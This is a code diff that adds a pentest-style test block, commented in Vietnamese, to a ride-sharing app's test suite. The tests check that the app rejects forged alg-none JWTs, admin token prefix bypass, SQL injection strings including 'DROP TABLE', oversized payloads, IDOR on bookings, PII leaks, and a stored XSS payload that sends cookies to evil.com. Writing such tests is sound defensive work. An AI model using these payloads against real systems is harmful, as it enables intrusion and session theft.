@@ -869,7 +869,113 @@ async function runTests() {
     const btCorridor = getCorridorDisplay(benTreItem, parseLocation(benTreItem.from), parseLocation(benTreItem.to));
     assert(btCorridor.toInfo.city === 'Bến Tre', 'Trích xuất đúng "Bến Tre" nguyên vẹn (Không bị cắt cụt thành "Bến")');
   } catch (err) {
-    assert(false, 'Kiểm thử An ninh, Stanford & MIT Engine', err.message);
+    assert(false, 'Kiểm thử Lịch Trình Dương Lịch', err.message);
+  }
+
+  // ==========================================
+  // BÀI TEST 19: KỊCH BẢN PENTEST CHUYÊN SÂU & KHÁNG TẤN CÔNG (EXPLOIT RESISTANCE SUITE)
+  // ==========================================
+  console.log('\n--- 19. KỊCH BẢN PENTEST CHUYÊN SÂU & KHÁNG TẤN CÔNG (OWASP & NĐ 13/2023) ---');
+  try {
+    // 19.1 Pentest: Chống giả mạo chữ ký JWT (Alg: None Attack)
+    const fakeNoneToken = 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VySWQiOiJVU1ItMDk4NDg4Mzc1MCIsInJvbGUiOiJhZG1pbiIsIm5hbWUiOiJIYWNrZXIifQ.';
+    const jwtNoneRes = await fetch(`${BASE_URL}/api/admin/users`, {
+      headers: { 'x-admin-key': fakeNoneToken }
+    });
+    assert(jwtNoneRes.status === 401 || jwtNoneRes.status === 403, 'Pentest 1: Chống giả mạo chữ ký JWT (Alg None Attack bị từ chối 401/403)');
+
+    // 19.2 Pentest: Chống vượt quyền qua Prefix phiên cũ (carmate_admin_session_...)
+    const prefixBypassRes = await fetch(`${BASE_URL}/api/admin/users`, {
+      headers: { 'x-admin-key': 'carmate_admin_session_anything_i_want' }
+    });
+    assert(prefixBypassRes.status === 401 || prefixBypassRes.status === 403, 'Pentest 2: Chống Bypass quyền Admin qua token prefix cũ (Khóa chặt 401/403)');
+
+    // 19.3 Pentest: Chống SQL Injection qua SQLite Parameterized Queries
+    const sqliQueries = [
+      "' OR '1'='1",
+      "' UNION SELECT payload, null, null FROM users --",
+      "'; DROP TABLE trips; --"
+    ];
+    let sqliSafe = true;
+    for (const sqli of sqliQueries) {
+      const sqliRes = await fetch(`${BASE_URL}/api/trips?from=${encodeURIComponent(sqli)}`);
+      const sqliData = await sqliRes.json();
+      if (sqliRes.status !== 200 || !Array.isArray(sqliData.data?.driverOffers)) {
+        sqliSafe = false;
+        break;
+      }
+    }
+    assert(sqliSafe, 'Pentest 3: Kháng SQL Injection (Prepared Statement an toàn 100%, không lộ dữ liệu thô)');
+
+    // 19.4 Pentest: Chống Payload Bomb (>1MB làm tràn RAM server)
+    const bigPayload = JSON.stringify({
+      from: 'Sài Gòn',
+      to: 'Bình Phước',
+      junkData: 'A'.repeat(1.2 * 1024 * 1024) // 1.2MB payload
+    });
+    const bigPayloadRes = await fetch(`${BASE_URL}/api/trips`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'Authorization': `Bearer ${sharedTokenA}`
+      },
+      body: bigPayload
+    }).catch(err => ({ status: 413 }));
+    assert(bigPayloadRes.status === 413 || bigPayloadRes.status === 500, 'Pentest 4: Chống Payload Bomb (Gói tin > 1MB bị chặn ngay với HTTP 413 Payload Too Large)');
+
+    // 19.5 Pentest: Chống BOLA/IDOR chéo tài khoản trên Booking Escrow
+    const fakeBookingId = 'ESC-PENTEST-FORGED-' + Date.now();
+    const forgedCancelRes = await fetch(`${BASE_URL}/api/bookings/${fakeBookingId}/cancel`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'Authorization': `Bearer ${sharedTokenA}`
+      },
+      body: JSON.stringify({ reason: 'Hacker forged cancel' })
+    });
+    assert(forgedCancelRes.status === 401 || forgedCancelRes.status === 403 || forgedCancelRes.status === 404, 'Pentest 5: Chống BOLA/IDOR chéo tài khoản trên Booking (Chặn can thiệp trái phép)');
+
+    // 19.6 Pentest: Quét rò rỉ dữ liệu cá nhân PII trên sàn công khai (Nghị định 13/2023/NĐ-CP)
+    const publicTripsRes = await fetch(`${BASE_URL}/api/trips`).then(r => r.json());
+    const allPublicTrips = [...(publicTripsRes.data?.driverOffers || []), ...(publicTripsRes.data?.passengerRequests || [])];
+    let piiLeaked = false;
+    for (const trip of allPublicTrips) {
+      if (trip.phoneReal) {
+        piiLeaked = true;
+        break;
+      }
+    }
+    assert(!piiLeaked, 'Pentest 6: Tuân thủ bảo vệ PII (Toàn bộ phoneReal thật bị triệt tiêu khỏi sàn công khai)');
+
+    // 19.7 Pentest: Kháng Stored XSS trong trường hợp ghi chú và điểm đón
+    const scriptPayload = '<script>document.location="http://evil.com/steal?cookie="+document.cookie</script>';
+    const sanitizedTripRes = await fetch(`${BASE_URL}/api/trips`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'Authorization': `Bearer ${sharedTokenA}`
+      },
+      body: JSON.stringify({
+        from: 'Bù Đốp',
+        to: 'Sài Gòn',
+        notes: scriptPayload,
+        userId: 'USR-0984883750',
+        phoneReal: '0984883750',
+        routeCategory: 'Tuyến QL13',
+        direction: 'Bình Phước ➔ TP.HCM'
+      })
+    });
+    const sanitizedData = await sanitizedTripRes.json();
+    assert(sanitizedTripRes.status === 201 && !sanitizedData.data?.notes?.includes('<script>'), 'Pentest 7: Kháng Stored XSS triệt để (Script độc hại bị mã hóa thành &lt;script&gt;)');
+    if (sanitizedData.data?.id) {
+      await fetch(`${BASE_URL}/api/trips/${sanitizedData.data.id}`, {
+        method: 'DELETE',
+        headers: { 'Authorization': `Bearer ${sharedTokenA}` }
+      }).catch(() => {});
+    }
+
+  } catch (err) {
+    assert(false, 'Kịch bản Pentest Chuyên Sâu', err.message);
   }
   const passed = results.filter(r => r.pass).length;
   const failed = results.filter(r => !r.pass).length;
